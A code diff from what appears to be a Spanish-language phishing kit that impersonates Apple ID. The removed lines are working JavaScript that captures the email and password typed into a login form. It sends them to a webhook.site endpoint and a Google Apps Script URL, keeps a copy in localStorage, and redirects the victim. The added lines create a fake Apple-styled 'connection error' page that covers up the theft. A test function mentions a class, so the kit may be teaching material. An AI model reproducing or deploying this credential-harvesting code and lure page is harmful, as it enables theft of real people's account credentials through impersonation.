@@ -1,89 +1,23 @@
-// ============================================
-// CONFIGURACIÓN - PON TUS URLS AQUÍ
-// ============================================
-const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbzCDq6YqvVtj1JIh6OI0bxYWxwG_4NtKwM3te6ovgAtjKtx52bndksZKVfkOvuVXY0s/exec';
-const WEBHOOK_URL = 'https://webhook.site/01c13946-944a-43a1-983b-1c7944ab4c99'; // ← PON LA URL DE WEBHOOK.SITE
-
-// ============================================
-// CÓDIGO PRINCIPAL
-// ============================================
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('✅ Sistema listo');
-    console.log('📤 Webhook configurado:', WEBHOOK_URL);
-    
-    const formulario = document.getElementById('loginForm');
-    
-    if (formulario) {
-        formulario.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Obtener valores
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Crear objeto con datos
-            const datos = {
-                email: email,
-                password: password,
-                hora: new Date().toLocaleTimeString(),
-                fecha: new Date().toLocaleString(),
-                navegador: navigator.userAgent
-            };
-            
-            console.log('📤 Enviando datos:', datos);
-            
-            // 1️⃣ ENVIAR A WEBHOOK.SITE (lo ves en vivo)
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(datos)
-            })
-            .then(() => console.log('✅ Enviado a webhook'))
-            .catch(error => console.log('❌ Error webhook:', error));
-            
-            // 2️⃣ ENVIAR A GOOGLE SHEETS (si está configurado)
-            if (GOOGLE_SHEETS_URL.includes('script.google.com')) {
-                fetch(GOOGLE_SHEETS_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(datos)
-                })
-                .then(() => console.log('✅ Enviado a Google Sheets'))
-                .catch(() => {});
-            }
-            
-            // 3️⃣ Guardar localmente (por si acaso)
-            try {
-                let registros = JSON.parse(localStorage.getItem('apple_registros')) || [];
-                registros.push(datos);
-                localStorage.setItem('apple_registros', JSON.stringify(registros));
-            } catch(e) {}
-            
-            // Redirigir a error
-            window.location.href = 'error.html';
-        });
-    }
-});
-
-// ============================================
-// FUNCIÓN DE PRUEBA
-// ============================================
-window.probarWebhook = function() {
-    const testData = {
-        email: "test@clase.com",
-        password: "prueba123",
-        hora: new Date().toLocaleTimeString(),
-        fecha: new Date().toLocaleString(),
-        prueba: true
-    };
-    
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(testData)
-    })
-    .then(() => alert('✅ Mensaje de prueba enviado a webhook'))
-    .catch(() => alert('❌ Error revisa la URL'));
-};
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error - Apple ID</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f7; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .error-card { background: white; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; }
+        h1 { color: #dc3545; margin-bottom: 15px; }
+        p { color: #6c757d; margin-bottom: 25px; }
+        .button { background: #0071e3; color: white; padding: 12px 30px; border-radius: 8px; text-decoration: none; display: inline-block; }
+        .button:hover { background: #0077ed; }
+    </style>
+</head>
+<body>
+    <div class="error-card">
+        <h1>⛔ Error de conexión</h1>
+        <p>No se pudo conectar con los servidores de Apple.<br>Por favor, intenta de nuevo más tarde.</p>
+        <a href="index.html" class="button">Volver a intentar</a>
+    </div>
+</body>
+</html>
